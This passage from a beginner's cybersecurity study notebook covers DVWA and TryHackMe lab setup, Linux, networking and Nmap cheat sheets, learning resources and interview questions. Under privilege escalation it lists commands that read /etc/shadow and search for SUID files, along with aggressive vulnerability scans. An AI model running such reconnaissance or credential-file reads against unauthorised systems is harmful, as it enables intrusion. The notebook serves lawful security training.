git clone https://github.com/digininja/DVWA /var/www/html/dvwa
cd /var/www/html/dvwa/config
cp config.inc.php.dist config.inc.php
# Edit database settings, start services
sudo service apache2 start
sudo service mysql start
# Visit http://localhost/dvwa
```

**5. Connect to TryHackMe**
- Sign up at tryhackme.com
- Download OpenVPN config
- `sudo openvpn <config>.ovpn` (on Kali)
- Machines become accessible via their THM IP

**6. Network Setup (important)**
```
Host Machine
     |
     +--- VirtualBox Host-Only Network (192.168.56.0/24)
          |
          +--- Kali Linux (192.168.56.x) ← Your attack machine
          |
          +--- Metasploitable 2 (192.168.56.y) ← Target
```

---

# LINUX COMMANDS CHEAT SHEET

## Navigation
```bash
pwd | ls -la | cd / | cd ~ | cd .. | find / -name "*.txt"
```

## File Operations
```bash
cat file | less file | head -20 file | tail -f file
cp src dst | mv src dst | rm -rf dir | mkdir -p dir/sub
touch file | nano file | vi file | chmod 755 file | chown user file
```

## Search
```bash
grep -r "pattern" /path     # Recursive search
grep -i "TEXT" file         # Case insensitive
find / -name "*.php" 2>/dev/null
find / -perm -4000 2>/dev/null   # SUID files
locate file                  # Fast find (db-based)
which nmap                   # Find binary location
```

## System
```bash
uname -a | id | whoami | hostname | env
ps aux | top | htop | kill PID
df -h | free -h | lsblk
systemctl status ssh | service ssh start
```

## Networking
```bash
ip addr | ifconfig | ip route
ping -c 4 IP | traceroute IP
ss -tulpn | netstat -an
dig domain | nslookup domain
wget URL | curl -I URL
iptables -L | ufw status
```

## Privilege & Users
```bash
sudo -l | sudo command | su - user
cat /etc/passwd | cat /etc/shadow | cat /etc/group
adduser name | passwd name | userdel -r name
usermod -aG sudo username
```

## Log Analysis
```bash
tail -f /var/log/auth.log
grep "Failed" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
journalctl -xe | journalctl -u ssh
last | lastlog | w
```

---

# NETWORKING CHEAT SHEET

## Key Ports (MEMORIZE)
```
20/21  FTP      |  22   SSH      |  23   Telnet (insecure)
25     SMTP     |  53   DNS      |  67/68 DHCP
80     HTTP     |  110  POP3     |  143  IMAP
443    HTTPS    |  445  SMB      |  3306 MySQL
3389   RDP      |  8080 HTTP-alt |  5432 PostgreSQL
```

## IP Ranges
```
Private: 10.0.0.0/8 | 172.16.0.0/12 | 192.168.0.0/16
Loopback: 127.0.0.1
Broadcast: 255.255.255.255
Subnet /24 = 254 hosts | /16 = 65534 | /32 = 1 host
```

## OSI Quick Reference
```
7-Application: HTTP, DNS, FTP, SMTP
4-Transport:   TCP (reliable), UDP (fast)
3-Network:     IP, ICMP, routing
2-Data Link:   Ethernet, MAC, switches
1-Physical:    Cables, hubs
```

## Nmap Quick Reference
```bash
nmap -sV -sC -p- --min-rate 5000 TARGET   # Full scan
nmap -sn 192.168.1.0/24                    # Host discovery
nmap -A TARGET                              # Aggressive
nmap --script vuln TARGET                  # Vuln scan
nmap -sU -top-ports 100 TARGET             # UDP top ports
```

---

# FREE RESOURCES & PLATFORMS

## Practice Platforms
- **TryHackMe** (tryhackme.com) — Best for beginners, guided learning
- **Hack The Box** (hackthebox.com) — More challenging, industry standard
- **PortSwigger Web Academy** (portswigger.net/web-security) — Best for web security, FREE
- **DVWA** — Local web app practice
- **PicoCTF** (picoctf.org) — CTF for beginners (Carnegie Mellon)
- **CTFTime** (ctftime.org) — Schedule of all CTF competitions

## Learning Websites
- **OWASP** (owasp.org) — Web security bible
- **Cybrary** (cybrary.it) — Free courses
- **SANS Reading Room** — Security research papers
- **MITRE ATT&CK** (attack.mitre.org) — Adversary framework

## YouTube Channels
- **NetworkChuck** — Networking and security, beginner-friendly
- **John Hammond** — CTFs, malware analysis
- **IppSec** — HackTheBox walkthrough (after you've tried)
- **LiveOverflow** — Deep-dive security concepts
- **TCM Security** — Practical ethical hacking courses
- **Gerald Auger (Simply Cyber)** — Blue team, SOC, career

## Books
- *The Web Application Hacker's Handbook* — Stuttard & Pinto
- *Hacking: The Art of Exploitation* — Jon Erickson
- *The Hacker Playbook 3* — Peter Kim
- *RTFM: Red Team Field Manual* — Ben Clark
- *Blue Team Handbook* — Don Murdoch

## GitHub Repositories
- **PayloadsAllTheThings** — Payload lists for web attacks
- **SecLists** — Wordlists for fuzzing/brute force
- **PEASS-ng** (LinPEAS/WinPEAS) — Privilege escalation scripts
- **Awesome-Hacking** — Curated list of hacking resources
- **GTFOBins** — Unix privilege escalation binaries

## TryHackMe Recommended Path
```
1. Pre-Security                (networking, Linux, web basics)
2. Complete Beginner           (hacking fundamentals)
3. Jr Penetration Tester       (full pentest methodology)
4. SOC Level 1                 (blue team fundamentals)
5. Offensive Pentesting        (advanced offensive techniques)
```

## HackTheBox Recommended Path
```
1. Starting Point (Tier 0–2)   (guided, beginner machines)
2. Easy machines               (retire, read walkthroughs after)
3. Pro Labs: Offshore/RastaLabs (advanced, when ready)
```

---

# MASTER INTERVIEW QUESTIONS

## Conceptual
1. Explain the CIA Triad with real-world examples for each
2. What is the difference between a vulnerability, threat, and exploit?
3. What is the difference between IDS and IPS?
4. Explain the TCP three-way handshake
5. What is the OSI model and why is it useful in security?
6. What is a zero-day vulnerability?
7. Explain the difference between symmetric and asymmetric encryption
8. What is the difference between hashing and encryption?
9. Explain what a Man-in-the-Middle attack is and how to prevent it
10. What is the OWASP Top 10?

## Technical
11. How does SQL injection work? How do you prevent it?
12. What is XSS and what are its types?
13. What is the difference between Metasploit's bind shell and reverse shell?
14. How does a SYN flood attack work?
15. Walk me through a penetration test from reconnaissance to reporting
16. How would you detect a brute force attack in logs?
17. What is the difference between SIEM and EDR?
18. What is privilege escalation and what are common Linux vectors?
19. Explain CSRF and how it differs from XSS
20. How does HTTPS work? What is TLS?

## Tools
21. What is Nmap used for? Name 5 flags and their purpose
22. What is Burp Suite and what is it used for?
23. How would you use SQLMap?
24. What is Wireshark used for? Name 3 display filters
25. How does Metasploit's msfconsole workflow go?

## Scenario-Based
26. You find a critical SQL injection on a client's login page. What do you do?
27. A user reports their computer is acting strangely. Walk me through your incident response
28. How would you secure a Linux web server from scratch?
29. You're given a target IP for a pentest. Walk me through your approach
30. You see 10,000 failed SSH logins in 60 seconds in auth.log. What do you do?

## Career
31. What certifications are you pursuing and why?
32. Tell me about a CTF challenge you solved
33. How do you stay updated on cybersecurity news?
34. What is your home lab setup?
35. Describe a vulnerability you found (in a lab) and how you reported it

---

*This notebook covers all 11 modules, a 60-day roadmap, lab setup, cheat sheets, platforms, and 35 interview questions — everything needed for an internship at Deep Cyte Cyber Labs UK and beyond.*

*Last Updated: May 2026 | Version 1.0*
